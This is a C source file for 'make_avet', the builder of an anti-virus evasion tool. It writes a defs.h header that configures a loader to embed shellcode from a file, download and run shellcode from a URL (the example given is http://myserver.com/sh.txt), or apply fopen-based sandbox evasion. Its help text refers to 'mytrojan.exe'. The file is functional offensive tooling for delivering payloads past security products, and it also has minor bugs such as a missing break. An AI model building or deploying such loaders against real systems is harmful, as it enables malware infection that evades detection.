/*
Author: Daniel Sauder
License: https://www.gnu.org/licenses/gpl.txt or LICENSE file
Web: https://github.com/govolution/avet
 */

#include <stdio.h>
#include <stdlib.h>
#include <unistd.h>

void print_start();
void print_help();
int print_debug;
int load_from_file;

int main (int argc, char **argv)
{
	print_start();

	print_debug = 0;
	load_from_file = 0;
	char *dvalue = NULL;
	char *evalue = NULL;
	char *fvalue = NULL;
	char *uvalue = NULL;
	char *wvalue = NULL;
	int hflag = 0;
	int Fflag = 0;

	int index;
	int c;

	opterr = 0;

	// compute the options
	while ((c = getopt (argc, argv, "d:e:f:u:w:lphF")) != -1)
		switch (c)
		{
			case 'd':
				dvalue = optarg;
				break;
			case 'e':
				evalue = optarg;
				break;
			case 'l':
				load_from_file = 1;
				break;
			case 'f':
				fvalue = optarg;
				break;
			case 'u':
				uvalue = optarg;
				break;
			case 'w':
				wvalue = optarg;
				break;
			case 'h':
				hflag = 1;
				break;
			case 'F':
				Fflag = 1;
			case 'p':
				print_debug = 1;
				break;
			case '?':
				if (optopt == 'd')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'e')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'f')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'u')
					fprintf (stderr, "Option -%c requires an argument.\n", optopt);
				else if (optopt == 'w')
					fprintf (stderr, "Option -%w requires an argument.\n", optopt);
				else if (isprint (optopt))
					fprintf (stderr, "Unknown option `-%c'.\n", optopt);
				else
					fprintf (stderr, "Unknown option character `\\x%x'.\n", optopt);
				return 1;
			default:
				abort ();
		}

	// print help
	if (hflag)
		print_help();
	else if (load_from_file)
	{
		//write LVALUE to defs.h
		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		//fseek (file_def, 0, SEEK_END);
		fprintf (file_def, "#define LVALUE\n");
		fclose(file_def);
	}
	// write shellcode from a given file to defs.h
	else if (fvalue)
	{
		printf ("write shellcode from %s to defs.h\n", fvalue);

		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fseek (file_def, 0, SEEK_END);
		//fprintf (file_def, "#define FVALUE\n");

		// read the shellcode file, write to defs.h
		FILE *file_sh = fopen ( fvalue, "r" );

		if ( file_sh != NULL )
		{
			fprintf (file_def, "#define FVALUE \"");
			char line [ 5000 ];

			while ( fgets ( line, sizeof line, file_sh ) != NULL )
				fprintf (file_def, "%s", line);           

			fprintf (file_def, "\"\n");
			//fprintf (file_def, "\\n");
			fclose ( file_sh );
		}
		else
			printf ("Error open %s\n", fvalue);

		fclose (file_def);
	}
	// exec from url
	else if (uvalue)
	{
		printf ("write url %s to defs.h\n", uvalue);

		FILE *file_def;
		file_def = fopen ("defs.h","w");

		if (file_def == NULL)
		{
			printf ("Error open defs.h\n");
			return -1;
		}

		fseek (file_def, 0, SEEK_END);
		fprintf (file_def, "#define UVALUE \"%s\"\n", uvalue);

		fclose (file_def);
	}

	//write LVALUE to defs.h
	if(print_debug)
	{		
			FILE *file_def;
			file_def = fopen ("defs.h","a");

			if (file_def == NULL)
			{
				printf ("Error open defs.h\n");
				return -1;
			}

			//fseek (file_def, 0, SEEK_END);
			fprintf (file_def, "#define PRINT_DEBUG\n");
			fclose(file_def);

	}
	
	//write SANDBOX_FOPEN to defs.h
	if(Fflag)
	{
		
			FILE *file_def;
			file_def = fopen ("defs.h","a");

			if (file_def == NULL)
			{
				printf ("Error open defs.h\n");
				return -1;
			}

			//fseek (file_def, 0, SEEK_END);
			fprintf (file_def, "#define SANDBOX_FOPEN\n");
			fclose(file_def);

	}

} //main



void print_help()
{
	printf("Options:\n");
	printf("-l load and exec shellcode from given file, call is with mytrojan.exe myshellcode.txt");
	printf("-f compile shellcode into avet.exe, needs filename\n");
	printf("-u load and exec shellcode from url using internet explorer (url is compiled into executable)\n");
	printf("-F use fopen sandbox evasion");
	printf("-p print debug information\n");
	printf("-h help\n\n");
	printf("Example usage:\n");
	printf("$ make_avet -u http://myserver.com/sh.txt -p\n");
	printf("$ make_avet -f shellcode.txt\n");
}

void print_start()
{
	char output[] =
		" ________  ___      ___ _______  _________  \n" 
		"|\\   __  \\|\\  \\    /  /|\\  ___ \\|\\___   ___\\ \n"
		"\\ \\  \\|\\  \\ \\  \\  /  / | \\   __/\\|___ \\  \\_| \n"
		" \\ \\   __  \\ \\  \\/  / / \\ \\  \\_|/__  \\ \\  \\  \n"
		"  \\ \\  \\ \\  \\ \\    / /   \\ \\  \\_|\\ \\  \\ \\  \\ \n"
		"   \\ \\__\\ \\__\\ \\__/ /     \\ \\_______\\  \\ \\__\\\n"
		"    \\|__|\\|__|\\|__|/       \\|_______|   \\|__|\n"
		"\n\nAnti Virus Evasion Make Tool by Daniel Sauder\n"
		"use -h for help\n\n";
	printf("\n%s", output);
}
